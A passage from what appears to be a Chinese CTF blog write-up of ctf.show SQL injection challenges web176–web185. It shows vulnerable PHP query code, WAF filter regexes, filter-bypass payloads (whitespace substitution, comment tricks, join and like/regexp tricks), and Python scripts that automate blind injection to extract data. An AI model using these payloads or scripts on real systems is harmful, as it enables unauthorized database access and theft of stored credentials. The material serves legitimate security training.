class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url + payload.<span class="built_in">format</span>(index, offset), timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        point = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">            start = point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = point</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>脚本输出flag。    </p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，还没弄清过滤了哪些字符，试了一个 payload 就出了 flag。<br>payload: <code>1&#39;or&#39;1&#39;=&#39;1</code><br>这里其实是对 select 进行了过滤，大小写就能绕过。<br>滑到底找到flag。    </p>
<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，尝试后发现过滤了空格(<code>%20</code>)，用 <code>%09</code> 代替即可。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;1&#x27; union select 1,2,(select password from ctfshow_user where username = &#x27;flag&#x27;) %23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bypass</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%09&quot;</span>) <span class="comment"># 这里用 %0a %0b %0c %0d /**/ 也可以</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bypass(a))</span><br></pre></td></tr></table></figure>
<p>payload: <code>1&#39;%09union%09select%091,2,(select%09password%09from%09ctfshow_user%09where%09username%09=%09&#39;flag&#39;)%09%23</code>    </p>
<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，和上一题差不多，可能增加了什么过滤，但用上一题的 payload 还是能打通。<br>payload: <code>1&#39;%09union%09select%091,2,(select%09password%09from%09ctfshow_user%09where%09username%09=%09&#39;flag&#39;)%09%23</code>     </p>
<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，和上上题差不多，增加了对 <code>%09 %0a %0b %0d</code> 的过滤，<code>%0c</code> 可以用。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;1&#x27; union select 1,2,(select password from ctfshow_user where username = &#x27;flag&#x27;) %23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bypass</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%0c&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bypass(a))</span><br></pre></td></tr></table></figure>
<p>payload: <code>1&#39;%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c&#39;flag&#39;)%0c%23</code>    </p>
<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，相比上题增加了对 <code>#</code>(<code>%23</code>) 的过滤，这里使用 <code>-- </code>(–后加个空格) 绕过。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;1&#x27; union select 1,2,(select password from ctfshow_user where username = &#x27;flag&#x27;) -- &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bypass</span>(<span class="params">s: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;%0c&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bypass(a))</span><br></pre></td></tr></table></figure>
<p>payload: <code>1&#39;%0cunion%0cselect%0c1,2,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=%0c&#39;flag&#39;)%0c--%0c</code>    </p>
<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，这次给出了过滤的函数 waf。<br>可知没有空格和 select 可以用，这里利用逻辑运算的优先级构造 and 语句，绕过查询语句前面的 <code>username != flag</code>，且不能含有空格。<br>由前几题或爆破可得，flag 所在记录的 id 列的值为 26，故构造<br>payload: <code>0&#39;or(id=26)and&#39;1</code><br>and 的优先级比 or 要高，故注入后的语句变成了<br><code>select id,username,password from ctfshow_user where username != &#39;flag&#39; and id = &#39;0&#39;or(id=26)and&#39;1&#39; limit 1;</code><br>前面满足条件 <code>id=0</code> 的记录不存在，故该语句可简化为<br><code>select id,username,password from ctfshow_user where (0) or(id=26)and&#39;1&#39; limit 1;</code><br>先计算 and，再计算 or，最后得到满足 <code>id=26</code> 的记录，即 flag。    </p>
<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的字符型注入，正则多过滤了一个 <code>flag</code>，上一题的 payload 可以继续用，当然如果想还可以盲注（脱裤子放屁）。。。<br>payload1: <code>0&#39;or(id=26)and&#39;1</code><br>payload2: <code>-1&#39;or(id=26)and(if(ascii(mid(password,&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),1))and&#39;1</code>    </p>
<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>有过滤的表名位置注入，返回结果只有记录的总数。过滤函数    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(pass) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>过滤 ban 掉了 <code>=</code>，使用 like 或 regexp 构造 payload 进行布尔盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ff8c3946-0975-4e96-b520-a7a95a9f5038.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;(ctfshow_user)where(pass)like(0x&#123;&#125;)&quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 1;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">has: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>((has + <span class="string">&quot;%&quot;</span>).encode().<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span> <span class="comment"># 这里注意表中用 like &#x27;ctf%&#x27; 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span> + string.digits + string.ascii_lowercase:</span><br><span class="line">        pd = flag+c</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[*] trying <span class="subst">&#123;pd&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(make_payload(pd)):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>脚本输出 flag。</p>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line">    <span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>有过滤表名位置注入，过滤相比上一题解禁了空格，增加了 where 和一些用不到的函数。    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>RIGHT JOIN（右连接）： 用于获取右表所有记录，即使左表没有对应匹配的记录。<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from persons; </span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | position |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | b477eRy  | 1        |</span><br><span class="line">|  2 | p1       | 1        |</span><br><span class="line">|  3 | p2       | 3        |</span><br><span class="line">|  4 | p3       | 2        |</span><br><span class="line">|  5 | p4       | 2        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from persons as a right join persons as b on b.position =3;        </span><br><span class="line">+------+----------+----------+----+----------+----------+</span><br><span class="line">| id   | username | position | id | username | position |</span><br><span class="line">+------+----------+----------+----+----------+----------+</span><br><span class="line">|    1 | b477eRy  | 1        |  3 | p2       | 3        |</span><br><span class="line">|    2 | p1       | 1        |  3 | p2       | 3        |</span><br><span class="line">|    3 | p2       | 3        |  3 | p2       | 3        |</span><br><span class="line">|    4 | p3       | 2        |  3 | p2       | 3        |</span><br><span class="line">|    5 | p4       | 2        |  3 | p2       | 3        |</span><br><span class="line">| NULL | NULL     | NULL     |  1 | b477eRy  | 1        |</span><br><span class="line">| NULL | NULL     | NULL     |  2 | p1       | 1        |</span><br><span class="line">| NULL | NULL     | NULL     |  4 | p3       | 2        |</span><br><span class="line">| NULL | NULL     | NULL     |  5 | p4       | 2        |</span><br><span class="line">+------+----------+----------+----+----------+----------+</span><br><span class="line">9 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>条件有一条记录满足时，记录总数 = 总数 * 2 - 1    </p>
</blockquote>
<p>过滤 ban 了 where，可以用 right/left/inner join 代替</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://89463a4c-73a0-4eb7-bc52-ed12c47bf60b.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass regexp(0x&#123;&#125;)&quot;</span></span><br><span class="line">true_flag = <span class="string">&quot;$user_count = 43;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">has: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> payload.<span class="built_in">format</span>((has).encode().<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;tableName&quot;</span>: p</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctf&quot;</span> <span class="comment"># 这里注意表中用 regexp(&#x27;ctf&#x27;) 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;&#123;&#125;-&quot;</span> + string.digits + string.ascii_lowercase:</span><br><span class="line">        pd = flag+c</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\r[*] trying <span class="subst">&#123;pd&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(make_payload(pd)):</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>脚本输出 flag。</p>
<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;tableName&#x27;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回用户表的记录总数</span></span><br><span class="line"><span class="variable">$user_count</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>有过滤的表名位置注入，这次过滤了所有数字，需要自己构造数字，char 转换数组成字符串。    </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>expression</th>
<th>number</th>
</tr>
</thead>
<tbody><tr>
<td>false</td>
<td>0</td>
</tr>
<tr>
<td>true</td>
<td>1</td>
</tr>
<tr>
<td>true+true</td>
<td>2</td>
</tr>
<tr>
<td>floor(pi())</td>
<td>3</td>
</tr>
<tr>
<td>ceil(pi())</td>
<td>4</td>
</tr>
<tr>
<td>floor(pi())+true</td>
<td>5</td>
</tr>
<tr>
<td>floor(pi())+floor(pi())</td>
<td>6</td>
</tr>
<tr>
<td>floor(pi())+ceil(pi())</td>
<td>7</td>
</tr>
<tr>
<td>ceil(pi())+ceil(pi())</td>
<td>8</td>
</tr>
<tr>
<td>floor(pi())*floor(pi())</td>
<td>9</td>
</tr>
<tr>
<td>floor(pi())*floor(pi())+true</td>
<td>10</td>
</tr>
<tr>
<td>写了半天发现正则还过滤了 <code>*</code>，只能硬加出来了。。。</td>
<td></td>
</tr>
</tbody></table>
